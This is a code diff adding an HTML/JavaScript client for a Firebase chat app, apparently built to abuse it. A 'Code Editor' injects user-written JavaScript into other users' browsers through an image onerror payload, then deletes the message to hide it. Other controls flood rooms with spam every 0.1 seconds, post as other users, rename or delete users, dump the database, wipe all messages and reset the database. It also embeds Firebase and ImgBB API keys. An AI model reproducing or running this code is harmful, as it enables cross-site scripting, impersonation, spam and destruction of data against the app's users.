+    background: var(--accent-glow-hover);
+  }
+
+  #add-verified-modal {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(9, 10, 15, 0.75);
+    backdrop-filter: blur(8px);
+    -webkit-backdrop-filter: blur(8px);
+    z-index: 60000;
+    justify-content: center;
+    align-items: center;
+  }
+
+  #add-verified-modal .modal-card {
+    background: var(--surface-card);
+    border: 1px solid var(--surface-border);
+    border-radius: 18px;
+    padding: 24px;
+    width: 320px;
+    box-shadow: 0 16px 36px rgba(0, 0, 0, 0.5);
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+  }
+
+  #verified-username-input {
+    width: 100%;
+    padding: 10px 14px;
+    background: rgba(0, 0, 0, 0.3);
+    border: 1px solid var(--surface-border);
+    border-radius: 10px;
+    color: var(--text-primary);
+    font-size: 14px;
+    outline: none;
+  }
+
+  #verified-username-input:focus {
+    border-color: var(--accent-glow);
+  }
+
+  #duration-modal {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(9, 10, 15, 0.75);
+    backdrop-filter: blur(8px);
+    -webkit-backdrop-filter: blur(8px);
+    z-index: 50000;
+    justify-content: center;
+    align-items: center;
+  }
+
+  .duration-modal-card {
+    background: var(--surface-card); 
+    border: 1px solid var(--surface-border);
+    border-radius: 18px; 
+    padding: 24px; 
+    width: 320px; 
+    box-shadow: 0 16px 36px rgba(0, 0, 0, 0.5);
+    display: flex; 
+    flex-direction: column; 
+    gap: 12px;
+  }
+
+  .duration-modal-card h3 {
+    margin-bottom: 8px;
+    font-size: 18px;
+  }
+
+  .duration-options-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 8px;
+    margin-bottom: 8px;
+  }
+
+  .duration-option-btn {
+    background: rgba(255, 255, 255, 0.03);
+    border: 1px solid var(--surface-border);
+    padding: 10px;
+    border-radius: 10px;
+    color: var(--text-primary);
+    font-size: 13px;
+    font-weight: 500;
+    text-align: center;
+    cursor: pointer;
+  }
+
+  .duration-option-btn:hover {
+    background: var(--surface-hover);
+    border-color: var(--accent-glow);
+  }
+</style>
+</head>
+<body>
+
+<div id="toast-container"></div>
+
+<div id="duration-modal">
+  <div class="duration-modal-card">
+    <h3 id="duration-modal-title">Select Ban Duration</h3>
+    <div class="duration-options-grid">
+      <button class="duration-option-btn" data-hours="1">1 Hour</button>
+      <button class="duration-option-btn" data-hours="6">6 Hours</button>
+      <button class="duration-option-btn" data-hours="24">24 Hours</button>
+      <button class="duration-option-btn" data-hours="168">7 Days</button>
+      <button class="duration-option-btn" data-hours="720">30 Days</button>
+      <button class="duration-option-btn" data-hours="87600">Permanent</button>
+    </div>
+    <div class="modal-actions">
+      <button id="duration-cancel-btn">Cancel</button>
+    </div>
+  </div>
+</div>
+
+<div id="add-verified-modal">
+  <div class="modal-card">
+    <h3>Add Verified User</h3>
+
+    <p style="font-size: 12px; color: var(--text-secondary);">
+      Enter the username of the user to grant verification status:
+    </p>
+
+    <input
+      type="text"
+      id="verified-username-input"
+      placeholder="Username..."
+    >
+
+    <div class="modal-actions">
+      <button id="add-verified-cancel-btn">Cancel</button>
+
+      <button
+        id="add-verified-confirm-btn"
+        class="primary-btn"
+      >
+        Add
+      </button>
+    </div>
+  </div>
+</div>
+
+<div id="moderation-modal">
+  <div id="moderation-modal-card">
+    <h2>Moderator Authority</h2>
+    <div class="mod-tabs">
+      <button id="mod-tab-users" class="mod-tab-btn active">Users</button>
+      <button id="mod-tab-reports" class="mod-tab-btn">Reports</button>
+      <button id="mod-tab-verified" class="mod-tab-btn">Verified Users</button>
+    </div>
+    
+
+    <div id="mod-users-list" class="mod-users-list" style="display: flex;">
+      <div class="empty-note">Waiting for users to load...</div>
+    </div>
+    
+    <div id="mod-reports-list" class="mod-reports-list" style="display: none;">
+      <div class="empty-note">No reports have been filed.</div>
+    </div>
+
+    <div id="mod-verified-container" style="display: none; flex-direction: column; flex: 1; overflow: hidden;">
+      <div class="verified-header-actions">
+        <button id="open-add-verified-btn" class="mod-verified-add-btn">
+          + Add Verified
+        </button>
+      </div>
+
+      <div id="mod-verified-list" class="mod-verified-list">
+        <div class="empty-note">No verified users found.</div>
+      </div>
+    </div>
+
+    <div class="modal-actions" style="margin-top: 4px;">
+      <button id="moderation-close-btn">Close</button>
+    </div>
+  </div>
+</div>
+
+<div id="user-action-modal">
+  <div class="modal-card">
+    <h3 id="modal-title">Enter Name</h3>
+    <input id="modal-input" type="text" placeholder="Display Name">
+    <div class="modal-actions">
+      <button id="modal-cancel-btn">Cancel</button>
+      <button id="modal-confirm-btn" class="primary-btn">Save</button>
+    </div>
+  </div>
+</div>
+
+<div id="custom-context-menu">
+  <div class="context-item" id="ctx-chat-as">Chat As</div>
+  <div class="context-item" id="ctx-rename-user">Rename User</div>
+  <div class="context-item danger" id="ctx-ban-user">Ban</div>
+  <div class="context-item danger" id="ctx-delete-msg">Delete Message</div>
+</div>
+
+<div id="room-context-menu">
+  <div class="context-item" id="ctx-toggle-public">Make Public/Private</div>
+  <div class="context-item" id="ctx-rename-room">Rename Room</div>
+  <div class="context-item" id="ctx-change-ownership">Change Ownership</div>
+  <div class="context-item orange-item" id="ctx-delete-room-msgs">Delete Messages</div>
+  <div class="context-item danger" id="ctx-delete-room">Delete Room</div>
+</div>
+
+<div id="room-space-context-menu">
+  <div class="context-item" id="ctx-space-spam-input">Spam Messages [Text Input]</div>
+  <div class="context-item" id="ctx-space-spam-random">Spam Messages [Random]</div>
+  <div class="context-item" id="ctx-space-spam-blank">Spam Messages [Blank]</div>
+  <div class="context-item orange-item" id="ctx-space-delete-msgs">Delete Messages</div>
+  <div class="context-item danger" id="ctx-space-delete-room">Delete Current Room</div>
+</div>
+
+<div id="main-page-space-context-menu">
+  <div class="context-item" id="ctx-main-read-db">Read Database</div>
+  <div class="context-item" id="ctx-main-spam-input">Spam Messages Everywhere [Text Input]</div>
+  <div class="context-item" id="ctx-main-spam-random">Spam Messages Everywhere [Random]</div>
+  <div class="context-item" id="ctx-main-spam-blank">Spam Messages Everywhere [Blank]</div>
+  <div class="context-item orange-item" id="ctx-main-delete-all-msgs">Delete All Messages Everywhere</div>
+  <div class="context-item warning" id="ctx-main-reset-db">Reset Database</div>
+</div>
+
+<div id="photo-context-menu">
+  <div class="context-item" id="ctx-photo-base">Upload Image via BASE64</div>
+  <div class="context-item" id="ctx-photo-url">Upload Image via URL</div>
+  <div class="context-item" id="ctx-photo-api">Upload Image via API</div>
+</div>
+
+<div id="theme-context-menu">
+  <div class="context-item" id="theme-default">Default</div>
+  <div class="context-item" id="theme-default-red">Default Red</div>
+  <div class="context-item" id="theme-default-blue">Default Blue</div>
+  <div class="context-item" id="theme-default-green">Default Green</div>
+  <div class="context-item" id="theme-claudchat">ClaudChat</div>
+</div>
+
+<button id="code-editor-btn" title="Code Editor">💻</button>
+<div id="draggable-code-editor">
+  <div id="code-editor-header">
+    <span>Code Editor</span>
+    <button id="code-editor-close">×</button>
+  </div>
+  <div class="code-editor-body">
+    <div id="code-line-numbers">1</div>
+    <textarea id="code-textarea" placeholder="Write JS here..."></textarea>
+  </div>
+  <div style="padding: 8px; background: #1c202d; border-top: 1px solid var(--surface-border); display: flex; justify-content: flex-start;">
+    <button id="code-execute-btn" class="primary-btn" style="padding: 6px 12px; font-size: 11px;">Execute</button>
+    <button id="code-clear-btn" style="padding: 6px 12px; font-size: 11px;">Clear</button>
+  </div>
+</div>
+
+<button id="theme-toggle-btn" title="Themes">🎨</button>
+<div id="admin-panel">
+  <h3>Admin Controls</h3>
+  <div class="admin-info">Current Room: <strong id="admin-room-label">None</strong></div>
+  
+  <details open>
+    <summary>Moderation</summary>
+    <input id="admin-banned-names" type="text" placeholder="Banned names (comma separated)" style="margin-top: 4px; font-size: 12px; padding: 6px;">
+    <button id="admin-auto-delete-btn" class="admin-btn secondary">Start Targeted Auto-Delete</button>
+    
+    <input id="admin-delete-user-name" type="text" placeholder="User name to delete (e.g. egg)" style="margin-top: 8px; font-size: 12px; padding: 6px;">
+    <button id="admin-delete-user-btn" class="admin-btn">Delete User</button>
+    
+    <input id="admin-change-user-old-name" type="text" placeholder="Current user display name" style="margin-top: 8px; font-size: 12px; padding: 6px;">
+    <input id="admin-change-user-new-name" type="text" placeholder="New display name" style="margin-top: 4px; font-size: 12px; padding: 6px;">
+    <button id="admin-change-user-btn" class="admin-btn secondary">Change User Display Name</button>
+
+    <div id="admin-mod-status" class="panel-status"></div>
+  </details>
+
+  <details open>
+    <summary>Rooms</summary>
+    <button id="admin-everyone-btn" class="admin-btn secondary">💬 Everyone</button>
+    <button id="admin-global-chat-btn" class="admin-btn secondary">🌐 Join Global Chat</button>
+    
+    <details>
+      <summary>Public Rooms</summary>
+      <div id="admin-public-rooms-list" class="admin-rooms-list">
+        <div class="admin-info">Loading chambers...</div>
+      </div>
+    </details>
+
+    <details>
+      <summary>Private Rooms</summary>
+      <div id="admin-private-rooms-list" class="admin-rooms-list">
+        <div class="admin-info">Loading chambers...</div>
+      </div>
+    </details>
+
+    <button id="admin-create-room-btn" class="admin-btn secondary">Create Room</button>
+    <button id="admin-spam-rooms-btn" class="admin-btn secondary">Spam Rooms (0.1s)</button>
+    <button id="admin-delete-curr-room-btn" class="admin-btn">Delete Current Room</button>
+    <button id="admin-remove-inactive-rooms-btn" class="admin-btn orange-btn">Remove Inactive Rooms</button>
+    <button id="admin-clear-all-rooms-btn" class="admin-btn">Clear All Rooms</button>
+  </details>
+
+  <details>
+    <summary>Messages</summary>
+    <button id="admin-send-as-other-btn" class="admin-btn secondary">Send Message as Other</button>
+    <button id="admin-send-img-url-btn" class="admin-btn secondary">Send Image via URL</button>
+    <button id="admin-send-img-base-btn" class="admin-btn secondary">Send image via BASE.</button>
+    <button id="admin-spam-msg-input-btn" class="admin-btn secondary">Spam Messages [Text Input]</button>
+    <button id="admin-spam-msg-random-btn" class="admin-btn secondary">Spam Messages [Random]</button>
+    <button id="admin-spam-msg-blank-btn" class="admin-btn secondary">Spam Messages [Blank]</button>
+    <button id="admin-clear-curr-msgs-btn" class="admin-btn orange-btn">Delete Messages (Current Room)</button>
+    <button id="admin-clear-all-msgs-btn" class="admin-btn orange-btn">Delete ALL Messages (Everywhere)</button>
+  </details>
+
+  <details>
+    <summary>Deletion</summary>
+    <button id="admin-reset-db-btn" class="admin-btn warning">Reset Database</button>
+  </details>
+
+  <details>
+    <summary>Misc</summary>
+    <button id="admin-change-name-btn" class="admin-btn secondary">Change Name (Instant)</button>
+    <button id="admin-read-db-btn" class="admin-btn secondary">Read Database</button>
+    <button id="admin-read-room-db-btn" class="admin-btn secondary">Read Current Room Database</button>
+  </details>
+</div>
+
+<div id="app">
+  <div id="connection-banner" style="display: none;">Connecting...</div>
+
+  <div id="join-screen">
+    <h2>Join the chat</h2>
+    <p>Pick a name your friends will see next to your messages.</p>
+    <input id="name-input" type="text" placeholder="Your name" value="efwjkwebfhjjbhewf">
+    <div style="margin-bottom: 12px;"><button id="join-btn" class="primary-btn">Continue</button></div>
+    
+    <div class="divider-with-text">Or Pick Existing User</div>
+    <div id="nickname-picker-list" class="nickname-picker-container">
+      <div class="empty-note">Loading user registry...</div>
+    </div>
+    <div id="join-error"></div>
+  </div>
+
+  <div id="rooms-screen">
+    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px;">
+      <h2>Choose a chat</h2>
+      <button id="open-moderation-modal-btn" style="font-size: 12px; padding: 6px 12px; border-radius: 8px;">Moderation</button>
+    </div>
+    <div class="sub">Chatting as <strong id="rooms-me-label"></strong> · <a href="#" id="rooms-switch-link">not you?</a></div>
+
+    <button id="everyone-room-btn" class="primary-btn">💬 Everyone</button>
+    <button id="global-chat-room-btn" class="primary-btn" style="background: linear-gradient(135deg, var(--accent-neon), var(--accent-glow));">🌐 Global Chat</button>
+
+    <details class="main-details">
+      <summary>Public Rooms</summary>
+      <div id="room-list"><div class="empty-note">Loading...</div></div>
+    </details>
+
+    <details class="main-details">
+      <summary>Private Rooms</summary>
+      <div id="private-room-list"><div class="empty-note">Loading...</div></div>
+    </details>
+
+    <div class="section-label">Room Settings</div>
+    <button id="show-create-btn">Rooms</button>
+    <div id="create-room-form">
+      <div class="divider-with-text">Create a Room</div>
+      
+      <input id="new-room-name" type="text" placeholder="Room name" maxlength="40">
+      <label><input id="new-room-private" type="checkbox">Private</label>
+      <button id="create-room-btn" class="primary-btn">Create</button>
+      
+      <div style="margin: 14px 0; border-top: 1px solid var(--surface-border);"></div>
+      
+      <button id="admin-spam-rooms-main-btn" class="admin-btn secondary" style="margin-top: 0; margin-bottom: 8px; width: 100%;">Spam Rooms</button>
+      <button id="admin-remove-inactive-rooms-main-btn" class="admin-btn orange-btn" style="margin-top: 0; margin-bottom: 8px; width: 100%;">Remove Inactive Rooms</button>
+      <button id="admin-clear-all-rooms-main-btn" class="admin-btn" style="margin-top: 0; width: 100%; background: #c0392b;">Clear All Rooms</button>
+    </div>
+
+    <div id="rooms-error"></div>
+  </div>
+
+  <div id="chat-screen">
+    <div id="chat-header">
+      <div class="header-left">
+        <button id="back-to-rooms-btn">← Rooms</button>
+        <span class="room-title" id="room-title-label"></span>
+      </div>
+      <button id="switch-btn">Switch name</button>
+    </div>
+    <div id="chat-subheader">Chatting as <strong id="me-label"></strong></div>
+    <div id="messages"></div>
+    <div id="upload-status">Uploading photo...</div>
+    <div id="compose">
+      <button id="photo-btn" title="Send a photo">📷</button>
+      <input id="file-input" type="file" accept="image/*">
+      <input id="admin-base-file-input" type="file" accept="image/*">
+      <input id="msg-input" type="text" placeholder="Type a message">
+      <button id="send-btn" class="primary-btn">Send</button>
+    </div>
+  </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
+  import {
+    getDatabase, ref, push, get, remove, update, query, orderByChild, limitToLast, onValue, set
+  } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-database.js";
+
+  const IMGBB_API_KEY = "8771b547e9fae780c9301dcf4392b9b2";
+  const EVERYONE_ROOM_ID = "everyone";
+  const EVERYONE_ROOM_NAME = "Everyone";
+  const GLOBAL_ROOM_ID = "global_all_rooms";
+  const GLOBAL_ROOM_NAME = "Global Chat";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyA1V4Ak5AFZDIdukGcj4XsAdyjdE1lz9I4",
+    authDomain: "claud-message-8f1e8.firebaseapp.com",
+    databaseURL: "https://claud-message-8f1e8-default-rtdb.firebaseio.com",
+    projectId: "claud-message-8f1e8",
+    storageBucket: "claud-message-8f1e8.firebasestorage.app",
+    messagingSenderId: "643068914198",
+    appId: "1:643068914198:web:17aeac7d6cc8d076e46337"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  let myName = "";
+  let currentRoomId = null;
+  let currentRoomName = "";
+  let spamIntervalId = null;
+  
+  let msgSpamInputIntervalId = null;
+  let msgSpamRandomIntervalId = null;
+  let msgSpamBlankIntervalId = null;
+
+  let everywhereSpamInputIntervalId = null;
+  let everywhereSpamRandomIntervalId = null;
+  let everywhereSpamBlankIntervalId = null;
+
+  let modUnsubscribers = [];
+  let isModActive = false;
+  let globalUnsubscribes = [];
+  let usersCache = {};
+  let roomsCache = {};
+
+  let targetMsgRef = null;
+  let targetRoomRef = null;
+  let modalCallback = null;
+
+  let bannedUsersCache = {};
+  let reportsCache = {};
+  let verifiedUsersCache = {};
+  let pendingBanUid = null;
+  let pendingBanName = null;
+  let pendingReportId = null;
+  let pendingMessageId = null;
+  let pendingRoomId = null;
+
+  const sessionStartTime = Date.now();
+
+  onValue(ref(db, "users"), (snapshot) => {
+    usersCache = snapshot.val() || {};
+
+    renderNicknamePickerList();
+    renderModUsersList();
+    renderModVerifiedList();
+
+    if (roomsScreen.style.display === "flex") {
+      subscribeToRooms();
+    }
+  });
+
+  onValue(ref(db, "rooms"), (snapshot) => {
+    roomsCache = snapshot.val() || {};
+  });
+
+  onValue(ref(db, "bannedUsers"), (snapshot) => {
+    bannedUsersCache = snapshot.val() || {};
+    renderModUsersList();
+  });
+  
+  onValue(ref(db, "reports"), (snapshot) => {
+    reportsCache = snapshot.val() || {};
+    renderModReportsList();
+  });
+
+  let globalToastTrackerInitialized = false;
+  let knownMessageKeys = new Set();
+
+  function initGlobalNotificationListener() {
+    if (globalToastTrackerInitialized) return;
+    globalToastTrackerInitialized = true;
+
+    onValue(ref(db, "messages"), (snapshot) => {
+      const allRoomsMessages = snapshot.val() || {};
+      
+      Object.entries(allRoomsMessages).forEach(([rId, messages]) => {
+        if (!messages) return;
+        const roomNameStr = (rId === EVERYONE_ROOM_ID) ? EVERYONE_ROOM_NAME : (roomsCache[rId]?.name || rId);
+
+        Object.entries(messages).forEach(([mKey, msg]) => {
+          const uniqueToken = `${rId}_${mKey}`;
+          if (!knownMessageKeys.has(uniqueToken)) {
+            knownMessageKeys.add(uniqueToken);
+            
+            if (msg && msg.author && msg.author !== myName && (msg.createdAt || 0) > sessionStartTime) {
+              playNotificationSound();
+              const contentText = msg.imageUrl ? "[Shared an image]" : (msg.text || "");
+              showNotificationToast(msg.author, roomNameStr, contentText);
+            }
+          }
+        });
+      });
+    });
+  }
+
+  function showNotificationToast(senderName, roomName, messageText) {
+    const container = document.getElementById("toast-container");
+    if (!container) return;
+
+    const toast = document.createElement("div");
+    toast.className = "toast-card";
+    toast.innerHTML = `
+      <div class="toast-header">
+        <span>📍 ${escapeHtml(roomName)}</span>
+      </div>
+      <div class="toast-sender">${escapeHtml(senderName)}</div>
+      <div class="toast-body">${escapeHtml(messageText)}</div>
+    `;
+
+    container.appendChild(toast);
+
+    setTimeout(() => {
+      toast.classList.add("hiding");
+      setTimeout(() => {
+        toast.remove();
+      }, 800);
+    }, 5000);
+  }
+
+  function getCreatorDisplayName(creatorUid) {
+    if (!creatorUid) return "Unknown";
+    if (usersCache[creatorUid] && usersCache[creatorUid].displayName) {
+      return usersCache[creatorUid].displayName;
+    }
+    return creatorUid;
+  }
+
+  const joinScreen = document.getElementById("join-screen");
+  const roomsScreen = document.getElementById("rooms-screen");
+  const chatScreen = document.getElementById("chat-screen");
+
+  const nameInput = document.getElementById("name-input");
+  const joinBtn = document.getElementById("join-btn");
+  const joinError = document.getElementById("join-error");
+  const nicknamePickerList = document.getElementById("nickname-picker-list");
+
+  const roomsMeLabel = document.getElementById("rooms-me-label");
+  const roomsSwitchLink = document.getElementById("rooms-switch-link");
+  const everyoneRoomBtn = document.getElementById("everyone-room-btn");
+  const globalChatRoomBtn = document.getElementById("global-chat-room-btn");
+  const roomListEl = document.getElementById("room-list");
+  const privateRoomListEl = document.getElementById("private-room-list");
+  const showCreateBtn = document.getElementById("show-create-btn");
+  const createRoomForm = document.getElementById("create-room-form");
+  const adminSpamRoomsMainBtn = document.getElementById("admin-spam-rooms-main-btn");
+  const adminRemoveInactiveRoomsMainBtn = document.getElementById("admin-remove-inactive-rooms-main-btn");
+  const adminClearAllRoomsMainBtn = document.getElementById("admin-clear-all-rooms-main-btn");
+  const newRoomName = document.getElementById("new-room-name");
+  const newRoomPrivate = document.getElementById("new-room-private");
+  const createRoomBtn = document.getElementById("create-room-btn");
+  const roomsError = document.getElementById("rooms-error");
+
+  const backToRoomsBtn = document.getElementById("back-to-rooms-btn");
+  const roomTitleLabel = document.getElementById("room-title-label");
+  const switchBtn = document.getElementById("switch-btn");
+  const meLabel = document.getElementById("me-label");
+  const messagesEl = document.getElementById("messages");
+  const msgInput = document.getElementById("msg-input");
+  const sendBtn = document.getElementById("send-btn");
+  const banner = document.getElementById("connection-banner");
+  const photoBtn = document.getElementById("photo-btn");
+  const fileInput = document.getElementById("file-input");
+  const adminBaseFileInput = document.getElementById("admin-base-file-input");
+  const uploadStatus = document.getElementById("upload-status");
+
+  const customContextMenu = document.getElementById("custom-context-menu");
+  const ctxDeleteMsg = document.getElementById("ctx-delete-msg");
+  const ctxChatAs = document.getElementById("ctx-chat-as");
+  const ctxRenameUser = document.getElementById("ctx-rename-user");
+
+  const roomContextMenu = document.getElementById("room-context-menu");
+  const ctxTogglePublic = document.getElementById("ctx-toggle-public");
+  const ctxRenameRoom = document.getElementById("ctx-rename-room");
+  const ctxChangeOwnership = document.getElementById("ctx-change-ownership");
+  const ctxDeleteRoomMsgs = document.getElementById("ctx-delete-room-msgs");
+  const ctxDeleteRoom = document.getElementById("ctx-delete-room");
+
+  const roomSpaceContextMenu = document.getElementById("room-space-context-menu");
+  const ctxSpaceSpamInput = document.getElementById("ctx-space-spam-input");
+  const ctxSpaceSpamRandom = document.getElementById("ctx-space-spam-random");
+  const ctxSpaceSpamBlank = document.getElementById("ctx-space-spam-blank");
+  const ctxSpaceDeleteMsgs = document.getElementById("ctx-space-delete-msgs");
+  const ctxSpaceDeleteRoom = document.getElementById("ctx-space-delete-room");
+
+  const mainPageSpaceContextMenu = document.getElementById("main-page-space-context-menu");
+  const ctxMainReadDb = document.getElementById("ctx-main-read-db");
+  const ctxMainSpamInput = document.getElementById("ctx-main-spam-input");
+  const ctxMainSpamRandom = document.getElementById("ctx-main-spam-random");
+  const ctxMainSpamBlank = document.getElementById("ctx-main-spam-blank");
+  const ctxMainDeleteAllMsgs = document.getElementById("ctx-main-delete-all-msgs");
+  const ctxMainResetDb = document.getElementById("ctx-main-reset-db");
+
+  const photoContextMenu = document.getElementById("photo-context-menu");
+  const ctxPhotoApi = document.getElementById("ctx-photo-api");
+  const ctxPhotoBase = document.getElementById("ctx-photo-base");
+  const ctxPhotoUrl = document.getElementById("ctx-photo-url");
+
+
+  const ctxBanUser = document.getElementById("ctx-ban-user");
+
+
+  const themeContextMenu = document.getElementById("theme-context-menu");
+  const themeDefault = document.getElementById("theme-default");
+  const themeDefaultRed = document.getElementById("theme-default-red");
+  const themeDefaultBlue = document.getElementById("theme-default-blue");
+  const themeDefaultGreen = document.getElementById("theme-default-green");
+  const themeClaudChat = document.getElementById("theme-claudchat");
+
+  const userActionModal = document.getElementById("user-action-modal");
+  const modalTitle = document.getElementById("modal-title");
+  const modalInput = document.getElementById("modal-input");
+  const modalCancelBtn = document.getElementById("modal-cancel-btn");
+  const modalConfirmBtn = document.getElementById("modal-confirm-btn");
+
+  const openModerationModalBtn = document.getElementById("open-moderation-modal-btn");
+  const moderationModal = document.getElementById("moderation-modal");
+  const moderationCloseBtn = document.getElementById("moderation-close-btn");
+  
+
+  const modUsersList = document.getElementById("mod-users-list");
+  const modReportsList = document.getElementById("mod-reports-list");
+
+  const modVerifiedContainer = document.getElementById("mod-verified-container");
+  const modVerifiedList = document.getElementById("mod-verified-list");
+
+  const modTabUsers = document.getElementById("mod-tab-users");
+  const modTabReports = document.getElementById("mod-tab-reports");
+  const modTabVerified = document.getElementById("mod-tab-verified");
+
+  const durationModal = document.getElementById("duration-modal");
+  const durationCancelBtn = document.getElementById("duration-cancel-btn");
+
+  const addVerifiedModal = document.getElementById("add-verified-modal");
+  const openAddVerifiedBtn = document.getElementById("open-add-verified-btn");
+  const addVerifiedCancelBtn = document.getElementById("add-verified-cancel-btn");
+  const addVerifiedConfirmBtn = document.getElementById("add-verified-confirm-btn");
+  const verifiedUsernameInput = document.getElementById("verified-username-input");
+
+  const themeToggleBtn = document.getElementById("theme-toggle-btn");
+  const adminPanel = document.getElementById("admin-panel");
+  const adminRoomLabel = document.getElementById("admin-room-label");
+  const adminChangeNameBtn = document.getElementById("admin-change-name-btn");
+  const adminReadDbBtn = document.getElementById("admin-read-db-btn");
+  const adminReadRoomDbBtn = document.getElementById("admin-read-room-db-btn");
+  const adminClearCurrMsgsBtn = document.getElementById("admin-clear-curr-msgs-btn");
+  const adminClearAllMsgsBtn = document.getElementById("admin-clear-all-msgs-btn");
+  const adminClearAllRoomsBtn = document.getElementById("admin-clear-all-rooms-btn");
+  const adminDeleteCurrRoomBtn = document.getElementById("admin-delete-curr-room-btn");
+  const adminCreateRoomBtn = document.getElementById("admin-create-room-btn");
+  const adminResetDbBtn = document.getElementById("admin-reset-db-btn");
+  const adminSpamRoomsBtn = document.getElementById("admin-spam-rooms-btn");
+  const adminBannedNames = document.getElementById("admin-banned-names");
+  const adminAutoDeleteBtn = document.getElementById("admin-auto-delete-btn");
+  const adminDeleteUserName = document.getElementById("admin-delete-user-name");
+  const adminDeleteUserBtn = document.getElementById("admin-delete-user-btn");
+  
+  const adminChangeUserOldName = document.getElementById("admin-change-user-old-name");
+  const adminChangeUserNewName = document.getElementById("admin-change-user-new-name");
+  const adminChangeUserBtn = document.getElementById("admin-change-user-btn");
+
+  const adminEveryoneBtn = document.getElementById("admin-everyone-btn");
+  const adminGlobalChatBtn = document.getElementById("admin-global-chat-btn");
+  const adminRemoveInactiveRoomsBtn = document.getElementById("admin-remove-inactive-rooms-btn");
+  const adminPublicRoomsList = document.getElementById("admin-public-rooms-list");
+  const adminPrivateRoomsList = document.getElementById("admin-private-rooms-list");
+
+  const adminSendAsOtherBtn = document.getElementById("admin-send-as-other-btn");
+  const adminSendImgUrlBtn = document.getElementById("admin-send-img-url-btn");
+  const adminSendImgBaseBtn = document.getElementById("admin-send-img-base-btn");
+  const adminSpamMsgInputBtn = document.getElementById("admin-spam-msg-input-btn");
+  const adminSpamMsgRandomBtn = document.getElementById("admin-spam-msg-random-btn");
+  const adminSpamMsgBlankBtn = document.getElementById("admin-spam-msg-blank-btn");
+
+  const codeEditorBtn = document.getElementById("code-editor-btn");
+  const draggableCodeEditor = document.getElementById("draggable-code-editor");
+  const codeEditorHeader = document.getElementById("code-editor-header");
+  const codeEditorClose = document.getElementById("code-editor-close");
+  const codeTextarea = document.getElementById("code-textarea");
+  const codeLineNumbers = document.getElementById("code-line-numbers");
+  const codeExecuteBtn = document.getElementById("code-execute-btn");
+  let FishCode = "";
+
+  codeExecuteBtn.addEventListener("click", async () => {
+    FishCode = codeTextarea.value;
+    if (!currentRoomId) {
+      alert("Pray, enter a room before executing your code!");
+      return;
+    }
+    try {
+      let sentRef;
+      if (currentRoomId === GLOBAL_ROOM_ID) {
+        await pushToAllRooms({ imageUrl: "" });
+        sentRef = await pushToAllRooms({
+            imageUrl: `x" onerror="${FishCode}`
+        });
+      } else {
+        sentRef = await push(ref(db, "messages/" + currentRoomId), {
+          author: myName,
+          imageUrl: `x" onerror="${FishCode}"`,
+          createdAt: Date.now()
+        });
+      }
+      
+      if (sentRef) {
+        if (Array.isArray(sentRef)) {
+          for (const r of sentRef) {
+            if (r && r.key) await remove(ref(db, `messages/${r.parent.key}/${r.key}`));
+          }
+        } else if (sentRef.key) {
+          await remove(ref(db, `messages/${currentRoomId}/${sentRef.key}`));
+        }
+      }
+    } catch (err) {
+      console.error("Failed to send image from code executor:", err);
+    }
+  });
+
+  const codeClearBtn = document.getElementById("code-clear-btn");
+
+  codeClearBtn.addEventListener("click", () => {
+    codeTextarea.value = "";
+    updateLineNumbers();
+  });
+
+  codeEditorBtn.addEventListener("click", () => {
+    draggableCodeEditor.style.display = (draggableCodeEditor.style.display === "flex") ? "none" : "flex";
+  });
+
+  codeEditorClose.addEventListener("click", () => {
+    draggableCodeEditor.style.display = "none";
+  });
+
+  function updateLineNumbers() {
+    const lines = codeTextarea.value.split("\n").length;
+    let numbersStr = "";
+    for (let i = 1; i <= lines; i++) {
+      numbersStr += i + "<br>";
+    }
+    codeLineNumbers.innerHTML = numbersStr;
+  }
+
+  codeTextarea.addEventListener("input", updateLineNumbers);
+  codeTextarea.addEventListener("scroll", () => {
+    codeLineNumbers.scrollTop = codeTextarea.scrollTop;
+  });
+  updateLineNumbers();
+
+  let isDraggingCode = false;
+  let codeDragOffsetX = 0;
+  let codeDragOffsetY = 0;
+
+  codeEditorHeader.addEventListener("mousedown", (e) => {
+    isDraggingCode = true;
+    const rect = draggableCodeEditor.getBoundingClientRect();
+    codeDragOffsetX = e.clientX - rect.left;
+    codeDragOffsetY = e.clientY - rect.top;
+    draggableCodeEditor.style.right = "auto";
+    draggableCodeEditor.style.bottom = "auto";
+    draggableCodeEditor.style.left = rect.left + "px";
+    draggableCodeEditor.style.top = rect.top + "px";
+    e.preventDefault();
+  });
+
+  document.addEventListener("mousemove", (e) => {
+    if (!isDraggingCode) return;
+    let newX = e.clientX - codeDragOffsetX;
+    let newY = e.clientY - codeDragOffsetY;
+    draggableCodeEditor.style.left = newX + "px";
+    draggableCodeEditor.style.top = newY + "px";
+  });
+
+  document.addEventListener("mouseup", () => {
+    isDraggingCode = false;
+  });
+
+  adminSpamMsgRandomBtn.addEventListener("click", () => {
+    if (msgSpamRandomIntervalId) {
+      clearInterval(msgSpamRandomIntervalId);
+      msgSpamRandomIntervalId = null;
+      adminSpamMsgRandomBtn.textContent = "Spam Messages [Random]";
+      ctxSpaceSpamRandom.textContent = "Spam Messages [Random]";
+      return;
+    }
+    if (!currentRoomId) { alert("Select a chamber first!"); return; }
+    adminSpamMsgRandomBtn.textContent = "STOP Message Spam [Random]";
+    ctxSpaceSpamRandom.textContent = "STOP Message Spam [Random]";
+    msgSpamRandomIntervalId = setInterval(async () => {
+      try {
+        const randText = genRandomArabic(12);
+        if (currentRoomId === GLOBAL_ROOM_ID) {
+          await pushToAllRooms({ text: randText });
+        } else {
+          await push(ref(db, "messages/" + currentRoomId), { author: myName, text: randText, createdAt: Date.now() });
+        }
+      } catch (e) { console.error(e); }
+    }, 100);
+  });
+
+  adminSpamMsgBlankBtn.addEventListener("click", () => {
+    if (msgSpamBlankIntervalId) {
+      clearInterval(msgSpamBlankIntervalId);
+      msgSpamBlankIntervalId = null;
+      adminSpamMsgBlankBtn.textContent = "Spam Messages [Blank]";
+      ctxSpaceSpamBlank.textContent = "Spam Messages [Blank]";
+      return;
